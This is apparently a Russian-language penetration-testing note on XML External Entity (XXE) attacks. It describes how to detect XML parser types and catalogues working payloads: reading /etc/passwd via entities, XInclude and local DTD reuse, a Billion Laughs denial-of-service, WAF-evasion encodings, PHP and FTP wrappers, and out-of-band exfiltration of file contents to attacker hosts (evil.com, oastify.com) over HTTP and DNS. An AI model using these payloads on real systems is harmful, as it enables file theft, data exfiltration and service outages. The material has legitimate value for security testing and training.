
# 1.  Поиск плоскости уязвимости

### 1.1. Где может встречаться XXE?

XXE-уязвимости могут встречаться в любом месте, где происходит обработка XML-документов. Основные места:

- **Веб-приложения**: API, SOAP, RESTful сервисы, формы загрузки файлов.
- **Микросервисы**: Взаимодействие между сервисами через XML.
- **Конфигурационные файлы**: Обработка XML-конфигураций.
- **Подобные форматы:** SVG, XHTML, RSS, Atom, XAML, KML, WSDL, DocBook, DOCX, XLSX,
- **Интеграции**: Взаимодействие с внешними системами через XML (например, банковские системы, ERP).
- **Мобильные приложения**: Передача данных в XML-формате.

### 1.2. Как искать XXE?

- **Анализ входных данных**: Ищите места, где приложение принимает XML-документы.
- **Исследование запросов**: Проверяйте HTTP-запросы, содержащие XML (например, POST-запросы с ==Content-Type: `application/xml` или `text/xml`==).
- **Анализ ответов**: Ищите ошибки, связанные с обработкой XML (например, ошибки парсера).
- **Внедрение внешних сущностей в ответы:** При блокировке DTD можем получить ответ Entities are not allowed for security reasons"
- **Использование инструментов**: Используйте сканеры уязвимостей (Burp Suite, OWASP ZAP) для автоматического поиска XXE.

----
# 2.  Анализ уязвимости

#### 2.1. Определение типа XML-обработки

Перед началом тестирования необходимо определить, какой тип обработки XML поддерживаются:
- **DTD (Document Type Definition)**: Стандартный способ определения структуры XML.
- **XML Schema (XSD)**: Более современный и строгий способ валидации XML.
- **RELAX NG**: Альтернативный способ описания структуры XML.

#### 2.2. Анализ структуры XML-документа

###### **DTD**:
- Наличие блока `<!DOCTYPE ...>` с определением сущностей или правил.
```
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test "Hello">
]>
<root>&test;</root>
```
- Если XML содержит такие конструкции, парсер, скорее всего, обрабатывает DTD.

###### **XML Schema (XSD):**
- Используется атрибут xsi:schemaLocation или xsi:noNamespaceSchemaLocation.
```
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:element name="note">
    <xs:complexType>
      <xs:sequence>
        <xs:element name="to" type="xs:string"/>
        <xs:element name="from" type="xs:string"/>
        <xs:element name="heading" type="xs:string"/>
        <xs:element name="body" type="xs:string"/>
      </xs:sequence>
    </xs:complexType>
  </xs:element>
</xs:schema>
```

###### **RELAX NG:**
- Менее распространен. Определяется через пространство имен `xmlns="http://relaxng.org/ns/structure/1.0"`.
- Пример кода
```
<element name="note" xmlns="http://relaxng.org/ns/structure/1.0">
  <element name="to"><text/></element>
  <element name="from"><text/></element>
  <element name="heading"><text/></element>
  <element name="body"><text/></element>
</element>
```

##### ==ДАЖЕ ПРИ ИСПОЛЬЗОВАНИЕ XSD ИЛИ RELAX NG МОЖЕТ ПОДДЕРЖИВАТЬСЯ DTD==

#### 2.3. Анализ ошибок парсера

Если DTD запрещен:
  - При отправке DTD-блока парсер вернет ошибку, например:
    `Error: DOCTYPE is disallowed.`

Если XSD используется:
  - Ошибки валидации будут связаны с нарушением структуры, например:
    `Invalid content: element 'xxx' is not expected.`

#### 2.4. Изучение документации и заголовков
- HTTP-заголовки:
  - Заголовки вроде Content-Type: application/xml или text/xml указывают на обработку XML.
- Документация API:
  - Если в API указаны XSD-схемы или требования к структуре данных, это помогает определить тип обработки.

#### Примеры реакций на разные типы обработки
| Тип обработки | Признаки                       | Вектор атаки                     |
| ------------- | ------------------------------ | -------------------------------- |
| DTD           | Обрабатывает <!ENTITY>, SYSTEM | Классический XXE, Billion Laughs |
| XSD           | Использует xsi:schemaLocation  | Внедрение внешних схем           |
| RELAX NG      | Пространство имен RelaxNG      | Мало уязвимо, если DTD отключен  |

#### Инструменты для автоматизации
- XXE-сканеры:
  - Инструменты вроде xxeinjector, XXExploiter автоматически проверяют реакцию на разные типы инъекций.
- Burp Suite:
  - Используйте плагины (например, "Collaborator") для отслеживания внешних запросов при тестировании XXE.

#### Ключевые выводы
1. Если парсер поддерживает DTD — возможны классические XXE-атаки.
2. XSD/RELAX NG чаще используются для валидации структуры, но иногда допускают внедрение внешних ресурсов.
3. Даже при отключенных DTD проверяйте, не обрабатываются ли сущности через другие механизмы (например, XInclude).


----
# 3. Виды атак

## 3.1. При видимой xxe

#### [[Работа с XXE использующая DTD формат#При видимой xxe|3.1.1. Проверка реакции на DTD-инъекции]]
#### [[Работа с XXE использующая XSD формат|3.1.2. Проверка реакции на XSD-инъекции]]
#### 3.1.3. Проверка реакции на RELAX NG-инъекции
некоторые реализации могут обрабатывать внешние сущности, если они включены.

Использование внешних ссылок
RELAX NG поддерживает включение внешних ресурсов с помощью элементов `<externalRef>`.
```
<externalRef href="http://attacker.com/malicious.rng"/>
```
- Если сервер загружает внешний RELAX NG-файл, это может быть уязвимостью.

#### 3.1.4. Общие уязвимости для XSD и RELAX NG

**Инъекции в значения атрибутов**
Если значения атрибутов не проверяются должным образом, злоумышленник может внедрить вредоносный код.

Внедрить специальные символы или скрипты
```
<element attribute="value"><![CDATA[<script>alert(1)</script>]]></element>
```
- Если сервер интерпретирует внедренный код, это указывает на уязвимость.

**Обработка больших файлов**
Неправильная обработка больших XML-файлов может привести к атакам типа "отказ в обслуживании" (DoS).

**Неправильная обработка пространств имен**

Использовать нестандартные пространства имен:
```
<ns:element xmlns:ns="http://attacker.com/malicious">
    <ns:child>data</ns:child>
</ns:element>
```



## 3.2. При blind xxe

#### [[Работа с XXE использующая DTD формат#При blind xxe|3.2.1. Проверка реакции на DTD-инъекции]]

#### [[Работа с XXE использующая XSD формат|3.1.2. Проверка реакции на XSD-инъекции]]

## 3.3. Экзотические

- Уязвимость может быть возможна даже при отключенных внешних сущностях, если парсер XML обрабатывает DTD (Document Type Definition) и разрешает использование внутренних сущностей, параметрических сущностей или других функций DTD
#### 1. Атака "Billion Laughs" (DoS через расширение сущностей)
Эта атака использует вложенные внутренние сущности для создания экспоненциального расширения данных, что приводит к отказу в обслуживании (DoS).
```
<?xml version="1.0"?>
<!DOCTYPE example [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<example>&lol3;</example>
```
Результат: Парсер пытается обработать &lol3;, что приводит к экспоненциальному росту данных (миллиарды символов "lol"), потребляя ресурсы сервера.

#### 2. Использование параметрических сущностей и локальных DTD
Если парсер обрабатывает DTD и разрешает параметрические сущности, можно использовать локальные DTD-файлы для обхода ограничений. Например:
```
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```
Как это работает:
1. Загружается локальный DTD-файл (`local_dtd`).
2. Переопределяется сущность ISOamso из этого файла.
3. Внедряется код для чтения файла /etc/passwd через создание ошибки (попытка загрузить несуществующий путь, содержащий данные из файла).

#### 3. Чтение локальных файлов через внутренние сущности (если разрешено)
Некоторые парсеры разрешают доступ к локальным файлам через file://, даже если внешние сущности отключены
```
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<test>&file;</test>
```
Условие: Если парсер не блокирует доступ к локальным файлам через file://, содержимое /etc/passwd может быть возвращено в ответе.



#### 4. XInclude (XML Inclusions)
Механизм для включения внешних ресурсов или фрагментов данных в XML-документы.

- Если парсер обрабатывает XInclude и не настроен безопасно, это может быть использовано для атак, похожих на XXE (XML External Entity), даже если обработка DTD и внешних сущностей отключена.

- XInclude не требует DTD для работы, поэтому часто остается активным, когда DTD отключены.

**Как проверить уязвимость к XInclude?**
1. Внедрите тег `<xi:include>`:
   Отправьте XML с включением внешнего ресурса (например, файла или URL):

Пример чтения файла `/etc/passwd`:
```
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```
 Атрибут parse определяет, как обрабатывать содержимое:
   - parse="text" — вставить как текст.
   - parse="xml" — интерпретировать как XML (может привести к повторным инъекциям).


#### 5 Использование XSLT
XSLT (Extensible Stylesheet Language Transformations) — это язык для преобразования XML-документов. Если XSLT не настроен безопасно, это может быть использовано для атак, похожих на XXE.

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:import href="http://attacker.com/malicious.xsl"/>
</xsl:stylesheet>
```

----
# 4. Обход защит от атаки

#### 4.1. Обход WAF

- Base64-кодировку
```
<!DOCTYPE foo [
  <!ENTITY % payload SYSTEM "data:;base64,ZmlsZTovLy9ldGMvcGFzc3dk">
]>
```
Здесь `ZmlsZTovLy9ldGMvcGFzc3dk` — это `file:///etc/passwd` в Base64.

- Hex-кодировку
```
<!ENTITY % ext SYSTEM "ht&#x74;p://evil.com">
```

- Разделение атаки через параметрические сущности
```
<!DOCTYPE foo [
  <!ENTITY % part1 "SY">
  <!ENTITY % part2 "STEM">
  <!ENTITY % combined "%part1;%part2;">
  <!ENTITY % payload SYSTEM "file:///etc/passwd">
]>
```

- Внедрение данных через CDATA может помочь скрыть вредоносные сущности
```
<data><![CDATA[<!ENTITY % xxe SYSTEM "file:///etc/passwd">]]></data>
```

#### 4.2. Атаки без явного определения сущностей

- Эксплуатация ошибок парсера. Некоторые парсеры (например, старые версии libxml2) имеют уязвимости, позволяющие читать файлы без DTD:
```
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="file:///etc/passwd"/>
</svg>
```

- Атаки через XML Schema (XSD)
```
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:import schemaLocation="http://evil.com/malicious.xsd"/>
</xs:schema>
```

#### 4.3. Использование нестандартных протоколов

- PHP-обертки
```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
```

- FTP/GOPHER
```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "ftp://evil.com:21/file.txt">
]>
```

#### 4.4. Использование других форматов данных

- Подмена Content-Type
```
POST /api HTTP/1.1
Content-Type: application/json

{"data": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"}
```


#### 4.5.  Эксфильтрация данных

**Через url**
```
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % exfiltrate "<!ENTITY &#x25; send SYSTEM 'http://xxx.oastify.com/?data=%file;'>">
  %exfiltrate;
]>
```
- Данные из /etc/passwd будут переданы в параметре data запроса к Collaborator.

**Через DNS**
Если HTTP-запросы блокируются, можно использовать DNS:
```
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % exfiltrate "<!ENTITY &#x25; send SYSTEM 'http://%file;.xxx.oastify.com/'>">
  %exfiltrate;
]>

```
Содержимое файла будет включено в поддомен (например, `root:x:0:0:.xxx.oastify.com`), что Collaborator зафиксирует через DNS.


#### 4.6. Обход проверки символов, разрешенные для использования в URL

![[Pasted image 20250201123233.png]]

- Кодировка base64
- Протокол ftp
#### [репозиторий на гите с payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)